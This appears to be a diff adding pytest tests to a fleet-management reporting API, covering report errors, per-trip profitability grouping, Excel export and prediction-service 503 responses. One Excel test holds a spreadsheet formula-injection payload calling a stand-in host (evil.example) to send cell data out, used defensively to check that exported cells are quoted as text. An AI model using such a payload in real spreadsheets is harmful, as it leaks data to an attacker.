@@ -171,3 +171,63 @@ def test_catalogo(cliente):
     r = cliente.get("/api/v1/reportes", headers=token("jefe_flota")).json()
     assert len(r["reportes"]) == 5
     assert r["reportes"][0]["parametros"]["required"] == ["desde", "hasta"]
+
+
+def test_reporte_desconocido_es_404(cliente):
+    r = cliente.get("/api/v1/reportes/NO_EXISTE", headers=token("gerente"))
+    assert r.status_code == 404 and r.json()["codigo"] == "NO_ENCONTRADO"
+
+
+def test_rentabilidad_por_viaje_agrupa_por_viaje_id(cliente):
+    ruta = "01933a00-0000-7000-8000-000000000004"
+    viajes = [str(uuid4()), str(uuid4())]
+    eventos = [ejemplo("RutaActualizada", rutaId=ruta)]
+    # Misma placa, misma ruta y mismo día: dos viajes son dos filas.
+    for v in viajes:
+        eventos += [
+            ejemplo("ViajeConfirmado", viajeId=v, rutaId=ruta),
+            ejemplo("EntregaConfirmada", viajeId=v, kmRecorridos=120, entregadoEn=f"{hoy()}T15:00:00Z"),
+            ejemplo("FacturaEmitida", facturaId=str(uuid4()), viajeId=v),
+        ]
+    procesar(*eventos)
+    rango = f"desde={hoy() - timedelta(days=1)}&hasta={hoy() + timedelta(days=1)}"
+    r = cliente.get(f"/api/v1/reportes/RENTABILIDAD?{rango}&agrupar=VIAJE", headers=token("gerente")).json()
+    assert sorted(f["viajeId"] for f in r["filas"]) == sorted(viajes)
+    assert [f["viajes"] for f in r["filas"]] == [1, 1] and r["filas"][0]["grupo"] == r["filas"][1]["grupo"]
+
+
+def test_excel_no_escribe_formulas_de_un_texto_del_cliente():
+    from datetime import UTC, datetime
+
+    from app.infraestructura.excel import libro
+
+    malicioso = '=HYPERLINK("http://evil.example/?d="&A2,"Ver factura")'
+    resultado = {
+        "titulo": "Cuentas por cobrar",
+        "parametros": {"desde": "2026-11-03"},
+        "columnas": [{"clave": "cliente", "titulo": "Cliente", "tipo": "TEXTO"}],
+        "filas": [{"cliente": malicioso}, {"cliente": "+591 7000"}, {"cliente": "@SUM(A1)"}, {"cliente": "Agroexport"}],
+        "totales": {},
+        "datosAl": None,
+    }
+    hoja = load_workbook(BytesIO(libro(resultado, "-sub", datetime.now(UTC))))["Datos"]
+    celdas = [hoja.cell(fila, 1) for fila in range(2, 6)]
+    assert [c.value for c in celdas] == [malicioso, "+591 7000", "@SUM(A1)", "Agroexport"]
+    assert all(c.data_type == "s" for c in celdas)
+    assert [c.quotePrefix for c in celdas] == [True, True, True, False]
+
+
+def test_riesgo_sin_modelo_o_sin_ruta_es_503_dependencia(cliente, monkeypatch):
+    viaje = str(uuid4())
+    procesar(ejemplo("ViajeConfirmado", viajeId=viaje), ejemplo("ViajeIniciado", viajeId=viaje))
+    r = cliente.get(f"/api/v1/predicciones/retraso/{viaje}", headers=token("despachador"))
+    assert r.status_code == 503 and r.json()["codigo"] == "DEPENDENCIA_NO_DISPONIBLE"
+    assert "modelo" in r.json()["detail"] and r.headers["retry-after"]
+
+    class Cargados(SinModelos):
+        cargados = True
+
+    # Con el modelo cargado, lo que falta es la copia de la ruta: el mensaje no culpa al modelo.
+    cliente.app.state.modelos = Cargados()
+    r = cliente.get(f"/api/v1/predicciones/retraso/{viaje}", headers=token("despachador"))
+    assert r.status_code == 503 and "modelo" not in r.json()["detail"] and "ruta" in r.json()["detail"]
